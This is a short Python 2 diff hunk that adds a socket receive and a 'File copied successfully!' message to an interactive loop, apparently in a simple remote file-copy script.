@@ -65,6 +65,8 @@ while True:
 		client.sendall(nname)
 		Name = raw_input("\033[01;32mOutput file name >\033[01;31m ")
 		client.sendall(Name)
+                o = client.recv(129382929)
+                print "\033[01;32File copied successfully! "
 		
 
 	
